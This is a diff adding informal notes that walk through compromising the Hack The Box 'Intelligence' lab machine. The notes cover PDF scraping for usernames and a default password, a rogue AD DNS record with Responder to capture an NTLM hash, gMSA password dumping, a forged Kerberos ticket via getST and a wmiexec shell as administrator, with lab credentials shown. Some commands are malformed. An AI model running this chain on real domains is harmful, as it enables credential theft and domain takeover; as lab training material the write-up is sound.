@@ -1,0 +1,55 @@
+to get date .. the link was like http://10.10.10.248/documents/2020-04-02-upload.pdf
+
+so get a loop on date part we use
+
+==for== i in {1243..878};do date --date "$i days ago" '+%Y-%m-%d-upload.pdf';done > file
+
+==for==  (cat file)==;do wget http://10.10.10.248/documents/
+
+then we sorted out username from exiftool..
+
+==exiftool== *.pdf | grep Creator | ==awk== '{print $3}' > user
+
+for i in $(ls);do ==pdftotext== $i;done   --convert pdf to txt soo that we can read inside of it
+
+cat *.txt | grep password -B4 -A4   --to grep extr 4 line after the matched word ..ie in this case passwrd
+
+to run bllodhound on the pc we dont have shell use bloodhound.py
+
+./==bloodhound.py== -d intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -dc intelligence.htb -ns 10.10.10.248 -c ALL
+
+in smbclient we found a script which says
+
+`# Check web server status. Scheduled to run every 5min`
+
+`Import-Module ActiveDirectory foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*") { try { $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials if(.StatusCode -ne 200) { Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down" } } catch {} }`
+
+so we used dnstool to Add/modify/delete Active Directory Integrated DNS records via LDAP.
+
+sudo python3 ==dnstool.py== -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.19 --type A 10.10.10.248
+
+then we used ==responder==  and caught hash ntlm
+
+again looking at bloodhound reviewing the ted account we saw ==READGMSAPpassword== and note  says to dump the password using that
+
+python3 ==gMSADumper.py== -u ted.graves -p Mr.Teddy -l 10.10.10.248 -d intelligence.htb
+
+we got hash of svc_int as bloodhound said .
+
+now we need to make a silver ticket so that we can log in using wmiexec into admin
+
+so we use getST but we first needed to update the skew clock so we did sudo ==ntpdate== 10.10.10.248
+
+then ran getST
+
+python3 ==getST==.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :fca9edf1c9fb8f031dfc38d918279642 -impersonate administrator intelligence.htb/svc_int
+
+we impersonate as admin and we were svc_int so we added svc_int ..  www/dc.int.. that was given in bloodhound.
+
+we got the admin.cache
+
+then we used wmiexec
+
+==KRB5CCNAME===administrator.ccache ==wmiexec==.py administrator@dc.intelligence.htb -no-pass -k
+
+thus we got  a shell
